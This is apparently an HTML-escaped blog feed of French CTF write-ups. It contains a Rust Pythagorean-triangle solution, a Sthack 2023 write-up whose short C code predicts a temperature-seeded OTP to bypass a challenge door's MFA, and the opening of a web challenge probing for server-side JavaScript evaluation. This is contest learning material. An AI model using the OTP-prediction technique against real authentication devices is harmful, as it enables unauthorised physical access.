        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_000_000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;// On initialise un vecteur afin de stocker le nombre de triangles de&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;// Pythagore par pÃ©rimÃ¨tre&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;vec!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;// Valeur maximale de m, pour laquelle a + b + c &amp;lt;= 1 000 000&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mlimit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;f64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mlimit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;// On check si m et n sont coprimes et ne sont pas tous les deux impairs&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;// Calculs du triplet de Pythagore&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nn&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;// Calcul du pÃ©rimÃ¨tre&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;c&quot;&gt;// On va ajouter les multiples du pÃ©rimÃ¨tre, et maj la valeur maximale si besoin&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result_count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;result_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Result is: {}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="Lehack-2023" /><summary type="html">Triangle Wars</summary></entry><entry><title type="html">Cant seem to make you mind</title><link href="http://localhost:4000/sthack-2023/cant_seem_to_make_you_mind.html" rel="alternate" type="text/html" title="Cant seem to make you mind" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/sthack-2023/cant_seem_to_make_you_mind</id><content type="html" xml:base="http://localhost:4000/sthack-2023/cant_seem_to_make_you_mind.html">&lt;p&gt;Voici un petit write up dâ€™un challenge physique proposÃ© de lors de la Sthack 2023  : Canâ€™t seem to make you mindÂ &lt;/p&gt;

&lt;p&gt;Ce challenge nous mettait dans la peau dâ€™un Hacktiviste cherchant Ã  sâ€™infiltrer dans les locaux de Evil Corp. DerriÃ¨re une porte protÃ©gÃ©e par un Code PIN se trouve tous leurs sale petits secrets, et malheureusement pour eux : on a obtenu ce code et on va bientÃ´t pouvoir les exposÃ©s Ã  la face du monde.&lt;/p&gt;

&lt;p&gt;MAIS, car il y a toujours un mais (Ã  lâ€™image dâ€™un Ã©pisode de Mr Robot, avoir le code ne suffit pas car le systÃ¨me est protÃ©gÃ© par une double authentification : un OTP (One Time Password) est envoyÃ© par SMS et il faut rentrer ce code dans les &lt;strong&gt;3 minutes&lt;/strong&gt; et en moins de &lt;strong&gt;10 tentatives&lt;/strong&gt;. Et bien Ã©videmment : nous nâ€™avons pas accÃ¨s Ã  ce tÃ©lÃ©phone.&lt;/p&gt;

&lt;p&gt;LÃ  vous vous dites : &lt;em&gt;â€œMais comment contourner une MFA, cette sÃ©curitÃ© spÃ©cifiquement conÃ§u pour vÃ©rifier lâ€™identitÃ© de la personne qui rentre un mot de passe ?&lt;/em&gt;â€&lt;/p&gt;

&lt;p&gt;Tout dâ€™abord, pour resituer les choses, nous avions accÃ¨s Ã  un vÃ©ritable boitier dâ€™accÃ¨s dont voici une reproduction Ã  nu (qui ne rend pas hommage au soin apportÃ© Ã  la finition par le concepteur du chall mais que voulez vous, dans le feu de lâ€™action Ã  5h du matin, on oublie de prendre des photos)
&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/c00414212c715b81be848b01f6a9d1a3.png&quot; alt=&quot;c00414212c715b81be848b01f6a9d1a3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous avions Ã©galement accÃ¨s Ã  la doc explicative ainsi quâ€™au code de lâ€™application et grÃ¢ce Ã  lui, on peut dâ€™ores et dÃ©jÃ  noter une premiÃ¨re information depuis les directives include : 
Le boitier utilise un Raspberry Pico comme micro controleur :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/b74edf8351cf5356fea3368f5f965955.png&quot; alt=&quot;b74edf8351cf5356fea3368f5f965955.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tout dâ€™abord, nous avons regardÃ© du cÃ´tÃ© de lâ€™envoi de SMS si y a pas possibilitÃ© de modifier le code pour recevoir le SMS, mais les valeurs sont Ã©crite en dur dans le programme.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/25b261150b0e312f4290d7a7d7185753.png&quot; alt=&quot;25b261150b0e312f4290d7a7d7185753.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Et puis en regardant comment lâ€™OTP est gÃ©nÃ©rÃ©, nous avons tout de suite remarquÃ© une chose : 
La seed (la valeur initial qui est utilisÃ©e pour crÃ©er de lâ€™alÃ©atoire et donc Ã©viter que le mot de passe soit prÃ©dictible) nâ€™utilise pas la faÃ§on habituelle de faire des micro controleur :&lt;/p&gt;

&lt;p&gt;En effet, dâ€™habitude pour crÃ©er une seed, les micro contoleur vont lire la valeur du voltage sur une de leur borne qui nâ€™est reliÃ© Ã  aucun composant : la valeur va ainsi dÃ©pendre du bruit ambient (onde radio, interfÃ©rence des tÃ©lÃ©phones portables, fond diffus cosmologique etcâ€¦). Ce qui rend la prÃ©diction quasiment impossible.&lt;/p&gt;

&lt;p&gt;Or ici, la seed est rÃ©cupÃ©rÃ©e Ã  partir de la valeur de la tempÃ©rature relevÃ© par un capteur interne :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/fdbaf316187c94cc69cc39a57d53e806.png&quot; alt=&quot;fdbaf316187c94cc69cc39a57d53e806.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Et une tempÃ©rature :  Ã§a peut se controler et si on connait la valeur que va renvoyer le capteur, on peut ainsi prÃ©voir la valeur du code OTP.&lt;/p&gt;

&lt;p&gt;A notre disposition, il y a en effet une bombe Ã  froid dont la fiche technique spÃ©cifie la tempÃ©rature exacte (En lâ€™occurence la notre Ã©tait Ã  -35 CÂ°) :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/090fdf58368c7c63863d649655bb7a9a.png&quot; alt=&quot;090fdf58368c7c63863d649655bb7a9a.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DÃ©sormais nous nâ€™avions plus quâ€™Ã  lire la datasheet technique du Raspberry Pico afin de trouver des informations sur comment le catpeur lit la tempÃ©rature et surtout sous quel format la fonction &lt;em&gt;read_onboard_temperature()&lt;/em&gt; renvoit la valeur.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/6291c0153bc28b1f135e90a9707d0e28.png&quot; alt=&quot;6291c0153bc28b1f135e90a9707d0e28.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alors nous avons recherchÃ© dans ce document de 639 pages https://datasheets.raspberrypi.com/rp2040/rp2040-datasheet.pdf 
, lâ€™information quâ€™il nous fallait et Ã  la page 566 nous avons trouvÃ© ceci :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/75b339ff373fc15088f967dd870fc823.png&quot; alt=&quot;75b339ff373fc15088f967dd870fc823.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Super, plus quâ€™Ã  faire une simple Ã©quation pour retrouver la valeur &lt;em&gt;raw&lt;/em&gt; pour T= -35, super facile non ? â€¦ non ?&lt;/p&gt;

&lt;p&gt;Et câ€™est ici que malheureusement, nous avons Ã©chouÃ© car oui cher lecteur ou lectrice : 
le flag on lâ€™a pas eu.&lt;/p&gt;

&lt;p&gt;Je pourrais vous lister tout un tas dâ€™excuse Ã  base de manque de sommeil et de temps, de nos outils qui ont mal gÃ©rÃ© les nombres Ã  virgules etc..  Bref Ã§a nâ€™a pas marchÃ©.&lt;/p&gt;

&lt;p&gt;Mais en reprenant Ã  froid (et en discutant avec le crÃ©ateur du challenge), voici le rÃ©sultat qui aurait pu nous apporter le flag :&lt;/p&gt;

&lt;p&gt;Nous savons que la tempÃ©rature est calculÃ© comme ceci :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uint16_t raw = adc_read();
const float conversion_factor = 3.3f / (1&amp;lt;&amp;lt;12); 
float result = raw * conversion_factor;
float temp = 27 - (result -0.706)/0.001721;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si on effectue lâ€™opÃ©ration inverse, nous pouvons dÃ©finir lâ€™expression suivante :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;raw = ((27 - (-35)) * 0.001721 + 0.706) / conversion_factor
raw = 0.812702 / (3.3 / 4096)
raw = 1008,7355733333 = 1008 (vu qu&apos;Ã  l&apos;origine c&apos;est un type int)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On reprend le code de lâ€™application quâ€™on modifie pour obtenir la valeur de lâ€™OTP :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define OTP_MIN 100000
#define OTP_MAX 999999

int main(void){
	int read_value_for_negative_35 = 1008;
	unsigned int seed = read_value_for_negative_35 + 324092;
	srand(seed);		 
	int otp = OTP_MIN + rand() % (OTP_MAX + 1 - OTP_MIN); 
	printf(&quot;l&apos;OTP est : %d\n&quot;, otp);
	return(1);
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/cantseemtomakeyoumind/8d1337025d434fbf4c0033890fc18baf.png&quot; alt=&quot;8d1337025d434fbf4c0033890fc18baf.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il nous aurait ensuite fallu refroidire le boitier jusquâ€™Ã  une tempÃ©rature de -35 CÂ° puis entrÃ©e le code PIN initial puis lâ€™OTP pour ouvrir la porte et accÃ©der aux sombres secrets de Evil Corp.&lt;/p&gt;</content><author><name></name></author><category term="Sthack-2023" /><summary type="html">Voici un petit write up dâ€™un challenge physique proposÃ© de lors de la Sthack 2023 : Canâ€™t seem to make you mindÂ </summary></entry><entry><title type="html">Chad CPT</title><link href="http://localhost:4000/sthack-2023/Chad-CPT.html" rel="alternate" type="text/html" title="Chad CPT" /><published>2023-05-12T00:00:00+02:00</published><updated>2023-05-12T00:00:00+02:00</updated><id>http://localhost:4000/sthack-2023/Chad-CPT</id><content type="html" xml:base="http://localhost:4000/sthack-2023/Chad-CPT.html">&lt;h1 id=&quot;chad-cpt&quot;&gt;Chad CPT&lt;/h1&gt;
&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Pour cette Ã©dition de la Sthack 2023, nous avons eu le droit Ã  une trÃ¨s grande variÃ©tÃ© de challenge. Nous vous proposons ici une rÃ©solution de lâ€™Ã©preuve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChadCPT&lt;/code&gt;, un challenge de type web avec une â€œIAâ€ un peu trop permissive.
Voici lâ€™Ã©noncÃ© :&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Do you know Chad CPT ?
The new SCAM â€œAIâ€ which can only solve simple math (like 1+1), this â€œAIâ€ is pretty stoned and does not seem to handle failureâ€¦
Retrieve the value of the flag located in the database.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/interface.png&quot; alt=&quot;interface&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lâ€™application ChadCPT consiste en un formulaire Ã  une seule entrÃ©e, ayant pour objectif de rÃ©pondre Ã  des opÃ©rations arithmÃ©tiques de type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2+2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3*3&lt;/code&gt;, â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/3+3.png&quot; alt=&quot;3+3&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;recherche-de-bug&quot;&gt;Recherche de bug&lt;/h2&gt;

&lt;p&gt;Nous cherchons dans un premier temps Ã  rÃ©aliser un bug sur lâ€™application dans le but dâ€™observer des situations potentiellement non prÃ©vues. Parmi les bugs classiques pouvant intervenir lors dâ€™opÃ©rations arithmÃ©tiques, nous retrouvons la fameuse division par zÃ©ro.&lt;/p&gt;

&lt;p&gt;En effectuant une division par zÃ©ro telle que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3/0&lt;/code&gt;, lâ€™application nous retourne une erreur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Infinity&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/30.png&quot; alt=&quot;30&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cette erreur non traitÃ©e est typique dâ€™un programme JavaScript :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/infinity.png&quot; alt=&quot;Infinity&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LÃ  oÃ¹ une application python (par exemple) aurait retournÃ© une erreur de type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZeroDivisonError&lt;/code&gt; :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/python.png&quot; alt=&quot;python&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Du JavaScript cÃ´tÃ© serveur, nous partons donc dans lâ€™hypothÃ¨se dâ€™une application dÃ©veloppÃ©e avec NodeJS.
Le programme Ã©tant rÃ©ceptif aux boolÃ©ens (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;), nous tentons ensuite de voir si celle-ci peut accepter les Ã©quations sous forme de conditions JavaScript. Effectivement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1==1&lt;/code&gt; nous rÃ©pond &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, quand &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1==2&lt;/code&gt; rÃ©sulte en lâ€™absence de rÃ©ponse (synonyme ici de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/1==1.png&quot; alt=&quot;1==1&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/1==2.png&quot; alt=&quot;1==2&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

